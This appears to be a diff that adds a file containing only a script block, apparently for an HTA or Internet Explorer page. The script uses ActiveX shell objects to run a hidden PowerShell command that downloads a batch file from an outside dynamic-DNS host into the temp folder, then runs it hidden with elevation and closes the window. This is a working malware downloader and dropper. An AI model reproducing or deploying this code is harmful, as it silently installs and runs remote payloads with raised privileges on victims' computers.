@@ -1,0 +1,24 @@
+<script>
+a=new ActiveXObject("WScript.Shell");
+pathtemp = a.ExpandEnvironmentStrings("%TEMP%");
+pathwin = a.ExpandEnvironmentStrings("%WINDIR%");
+//alert(pathtemp);
+//alert(pathwin);
+command=pathwin+'\\System32\\cmd.exe';
+argument='/c powershell.exe -Command (new-object System.Net.WebClient).DownloadFile(\'http://verifiche.ddns.net/win.bat\',\''+pathtemp+'\\win.bat\')';
+//alert(command);
+//alert(argument);
+//a.run(command+' '+command,0);
+b=new ActiveXObject("Shell.Application");
+b.ShellExecute(command, argument, null, "open", 0);
+window.setTimeout(myFunction, 3000);
+function myFunction() {
+    b=new ActiveXObject("Shell.Application");
+    command='c:\\windows\\System32\\cmd.exe';
+    argument='/c \"%temp%\\win.bat\"';
+    b.ShellExecute(command, argument, null, "runas", 0);
+    window.close();
+}
+
+</script>
+
